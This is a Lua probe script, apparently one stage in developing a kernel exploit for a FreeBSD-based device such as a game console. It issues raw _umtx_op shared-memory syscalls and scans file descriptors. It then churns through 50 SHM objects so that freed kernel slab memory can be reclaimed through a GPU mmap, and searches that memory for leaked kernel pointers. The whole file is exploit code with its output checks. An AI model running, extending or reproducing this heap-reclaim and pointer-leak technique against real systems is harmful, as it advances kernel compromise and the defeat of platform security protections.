-- CRASH_CLASS: MODERATE
-- PROBE 151c: UMTX SHM safe lifecycle + heap reclaim test
--
-- Context: 151a confirmed SHM ops work on 454. 151b crashed (pipe exhaustion).
-- This is a careful, minimal test:
--   A) SHM lifecycle with fd output check
--   B) Controlled create/destroy cycles
--   C) Check if destroyed SHM objects leave kernel data accessible

print("=== PROBE 151c: UMTX SHM SAFE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local sc_umtx = make_syscall(454)

print("")
print("--- SECTION A: SHM + FSTAT ---")

-- SHM_CREAT returns an fd. The fd points to a shmfd kernel object.
-- fstat on this fd might leak kernel info.
local key1 = memory.alloc(0x20)
memory.write_qword(key1, uint64(0x11111111))

-- Create SHM — check return value more carefully
local ok, ret = pcall(function()
    return sc_umtx(uint64(to_num(key1)), uint64(25), uint64(1), uint64(0), uint64(0))
end)
local h, l = 0, 0
if ok and ret then h, l = get_hi_lo(ret) end
print(string.format("SHM_CREAT ret: ok=%s h=0x%X l=0x%X", tostring(ok), h, l))

-- The return might be the fd number.
-- On FreeBSD, _umtx_op(SHM) with UMTX_SHM_CREAT creates a shared mapping
-- and returns 0 on success. The mapping fd might be returned differently.

-- Let's check the highest fd before and after
local sc_fstat = make_syscall(551)  -- __sys_fstat
local stat_buf = memory.alloc(0x100)

-- Check what fds are valid by testing with fstat
print("")
print("--- SECTION B: FD SCAN ---")
local valid_fds = {}
for fd = 0, 40 do
    for i = 0, 0xF8, 8 do memory.write_qword(stat_buf + i, uint64(0)) end
    local ok2, ret2 = pcall(function()
        return sc_fstat(uint64(fd), uint64(to_num(stat_buf)))
    end)
    if ok2 and to_num(ret2) == 0 then
        -- Read some stat fields
        local st_dev = to_num(memory.read_dword(stat_buf))
        local st_mode = to_num(memory.read_dword(stat_buf + 0x18))
        local st_size_lo = to_num(memory.read_dword(stat_buf + 0x48))
        valid_fds[#valid_fds + 1] = fd
        if fd <= 5 or fd >= 20 then
            print(string.format("fd=%d: dev=%d mode=0x%X size=%d", fd, st_dev, st_mode, st_size_lo))
        end
    end
end
print("valid_fds: " .. #valid_fds)
if #valid_fds > 0 then
    print("max_fd: " .. valid_fds[#valid_fds])
end

print("")
print("--- SECTION C: CREATE 10 SHM + SCAN ---")

-- Create 10 SHM objects with unique keys, check if new fds appear
local pre_max_fd = valid_fds[#valid_fds] or 0
local shm_keys = {}
for i = 1, 10 do
    local k = memory.alloc(0x20)
    memory.write_qword(k, uint64(0x22220000 + i))
    shm_keys[i] = k
    pcall(function()
        sc_umtx(uint64(to_num(k)), uint64(25), uint64(1), uint64(0), uint64(0))
    end)
end

-- Check for new fds
local new_fds = 0
for fd = pre_max_fd + 1, pre_max_fd + 20 do
    for i = 0, 0xF8, 8 do memory.write_qword(stat_buf + i, uint64(0)) end
    local ok2, ret2 = pcall(function()
        return sc_fstat(uint64(fd), uint64(to_num(stat_buf)))
    end)
    if ok2 and to_num(ret2) == 0 then
        local st_mode = to_num(memory.read_dword(stat_buf + 0x18))
        new_fds = new_fds + 1
        print(string.format("NEW fd=%d: mode=0x%X", fd, st_mode))
    end
end
print("new_fds_after_shm=" .. new_fds)

-- Destroy them
for i = 1, 10 do
    pcall(function()
        sc_umtx(uint64(to_num(shm_keys[i])), uint64(25), uint64(4), uint64(0), uint64(0))
    end)
end

print("")
print("--- SECTION D: SHM + GPU MMAP RECLAIM ---")

-- Strategy: create SHM objects, destroy them, then use GPU mmap to reclaim
-- the freed kernel allocations, and scan GPU memory for kernel pointers
local sc_mmap = make_syscall(477)

-- Create and destroy 50 SHM objects to fill and free slab entries
for i = 1, 50 do
    local k = memory.alloc(0x20)
    memory.write_qword(k, uint64(0x33330000 + i))
    pcall(function()
        sc_umtx(uint64(to_num(k)), uint64(25), uint64(1), uint64(0), uint64(0))
    end)
    pcall(function()
        sc_umtx(uint64(to_num(k)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)
end
print("destroyed 50 SHM objects")

-- GPU mmap to try to reclaim freed memory
local gpu_pages = 16
local gpu_size = gpu_pages * 0x4000
local ok_g, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(gpu_size), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
if not ok_g then
    print("GPU mmap failed")
else
    local gh, gl = get_hi_lo(gpu)
    print(string.format("GPU mmap at: 0x%X%08X size=0x%X", gh, gl, gpu_size))

    -- Scan GPU memory for kernel pointers
    local kptr_count = 0
    for off = 0, gpu_size - 8, 8 do
        local ok_r, val = pcall(function() return memory.read_qword(gpu + off) end)
        if ok_r and val then
            local vh, vl = get_hi_lo(val)
            if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF and vl ~= 0 then
                kptr_count = kptr_count + 1
                if kptr_count <= 20 then
                    print(string.format("GPU_KPTR +0x%X: 0x%08X%08X", off, vh, vl))
                end
            end
        end
    end
    print("gpu_kptr_count=" .. kptr_count)
end

print("")
print("--- SECTION E: SHM MMAP + READ ---")

-- Try to mmap the SHM object directly. On FreeBSD, UMTX_SHM can create
-- a POSIX shared memory fd that can be mmapped.
local mmap_key = memory.alloc(0x20)
memory.write_qword(mmap_key, uint64(0x44440001))

-- Create SHM
ok, ret = pcall(function()
    return sc_umtx(uint64(to_num(mmap_key)), uint64(25), uint64(1), uint64(0), uint64(0))
end)
print("SHM_CREAT: " .. tostring(ok) .. " ret=" .. tostring(to_num(ret or -1)))

-- shm_open equivalent — try to get the fd
-- On FreeBSD, SHM op creates an anonymous shared memory object.
-- The fd might be retrievable via the return value or a different op.

-- Try UMTX_SHM_LOOKUP which on some FreeBSD versions returns the fd
local fd_ptr = memory.alloc(0x10)
memory.write_dword(fd_ptr, 0xDEAD)
ok, ret = pcall(function()
    return sc_umtx(uint64(to_num(mmap_key)), uint64(25), uint64(2), uint64(to_num(fd_ptr)), uint64(0))
end)
local fd_after = to_num(memory.read_dword(fd_ptr))
print(string.format("LOOKUP ret=%d fd_ptr_after=%d (was 0xDEAD)", to_num(ret or -1), fd_after))

-- Destroy
pcall(function()
    sc_umtx(uint64(to_num(mmap_key)), uint64(25), uint64(4), uint64(0), uint64(0))
end)

-- Canary
ok, ret = pcall(function() return syscall.getpid() end)
print("")
print("canary: " .. tostring(ok) .. " pid=" .. tostring(to_num(ret)))

print("=== PROBE 151c COMPLETE ===")
